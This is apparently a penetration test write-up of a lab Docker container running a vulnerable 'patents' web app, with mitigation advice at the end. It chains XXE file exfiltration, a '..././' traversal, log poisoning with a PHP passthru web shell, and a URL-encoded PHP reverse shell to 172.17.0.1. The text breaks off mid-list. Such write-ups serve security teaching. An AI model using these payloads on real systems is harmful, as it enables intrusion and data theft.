@@ -1,0 +1,68 @@
+:|:  Penetration Test  :|:
+ 
+Hello, and good day to you! 
+On this engagement, our crew was tasked with analyzing a vulnerable webserver container based on ubuntu:18.04. This proved to be an interesting challenge with a couple technically intriguing twists and turns. 
+Armed with a Kali Linux 2020.3 vm, let’s get right into it. 
+_____________________________________________
+_____________________________________________
+ I) Analysis & Exploitation 
+Vulnerable Container:  ‘ patents:slim ’ 
+
+patents:slim   "apachectl -D FOREGR…"     0.0.0.0:80->80/tcp   trusting_margulis
+
+We spun up the image without too much trouble and began to probe the website, which is apparently a content management system of sorts which enables users to submit their own “Patents” as exhibits for inclusion into the collection presented by the site. It appears the site remains firmly within ‘development’ as the only immediately viable function appears to be the ‘Upload new patent’ aspect. 
+
+This looks suspect at the outset-
+Top of mind is of course, (XXE) XML external entities, as we’re asked to upload a local .DOCX which will be parsed by the webserver on the backend. Without proper controls on the server-side a malicious xml archive (such as a .DOCX) can engage an outside resource for inclusion of custom XML (through a data type definition).
+
+You could generate a basic docx with python, LibreOffice, or, you can carefully locate effective options on GitHub. With the assistance of the formidable PayloadsAllTheThings, we were able to settle upon a solution.
+
+We were able to leverage our rogue XML/DTD, essentially a set of xml instructions for parsing the document in question, to explain to the webserver how to handle our .docx upload. As a part of these instructions, the xml parser on the target exfiltrated any file that we had permission as the webserver user to read. Incidentally, the common ssl port was not being utilized for this webapp. Being arguably the best ‘real world engagement’ option, we made use of it (tcp/443) here for exploitation via our simple python webserver.
+ 
+Unwinding the base64 string provided the contents of the /etc/passwd file on the target container, great success!
+
+However, we don’t yet possess any worthwhile filenames to exfiltrate, assuming we can penetrate deeper into the web application. Using raft (within SecLists) we were able to quickly remedy this. It seems as though the development team left a ‘changelog’ of sorts lying around in plain sight. Sure, trivial information disclosure, but, a violation, nonetheless-
+
+
+
+
+
+
+
+ With this enumeration in hand, the overall scope of the engagement begins to take shape. Perhaps we can exfiltrate the app's configuration file. Fortunately for us, the patents web app was installed in the default apache webroot for ‘ubuntu’ based systems.
+While we weren’t able to utilize the same XXE process to get the source of this phantom alpha ‘GetPatent’ script, we had gathered plenty of errantly-disclosed information to allow us to forge ahead.
+
+Assuming that the most basic directory traversal was being dropped or sanitized out possibly by design, or by accident, we kept fuzzing manually until we found a workable pattern. The payload that proved to be the most useful for the whole of the engagement is presented above.
+
+Nice, but can we get code execution through by way of php?  Let’s see.
+
+We cannot pull and output the apache logs from their default location, which is a good thing, really. Can we once again leverage XXE and exfiltrate the apache configuration to see what might possibly be available elsewhere in the container’s filesystem? Yes.
+
+It would seem that the development team doubled up the access.log for the sake of convenience. This log file is anchored within the webroot so we should be able to complete the progression into a proper LFI.
+
+Presumably, the target will parse php to our liking. There are a few ways to inject the access log with directives and system calls. The most flexible we've found is to implant a php passthru command shell. We accomplished this with netcat (nc), and, we confirmed injection and remote command execution by instructing the ‘cmd’ directive to invoke ‘whoami’ to have apache tell us which user it was running as.  GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+
+http://127.0.0.1/getPatent_alphav1.0.php?id=..././..././..././..././..././var/www/html/logs/access.log&cmd=whoami
+
+Naturally, we’re www-data, this LFI is super effective.
+
+
+Now that we’ve achieved remote command execution (RCE) it’s time to see if we can land a shell on this docker instance. We know php is installed within the container so let’s not overthink it. We’ll url encode a php reverse shell and send it back to our listener, in this case, by way of the docker gateway bound to our Kali virtual machine.
+
+http://127.0.0.1/getPatent_alphav1.0.php?id=..././..././..././..././..././var/www/html/logs/access.log&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22172.17.0.1%22%2C2255%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27%0A
+
+Boom. 
+There doesn’t appear to be anything else to do from within the container, aside from attempting a breakout. The scope of the engagement was limited to the webserver, and as such, mission accomplished!
+
+
+_____________________________________________
+
+
+II) Mitigation Recommendations
+
+
+Patch the XXE flaw in the patents upload function immediately. > Disable DTD/XML integration outright within the container webapp. > https://www.netsparker.com/blog/web-security/xxe-xml-external-entity-attacks/ > libxml_disable_entity_loader(true);   <- required > https://phpsecurity.readthedocs.io/en/latest/Injection-Attacks.html > https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html >
+
+Remove broken or vulnerable “alpha” code from the webroot. 
+
+c)
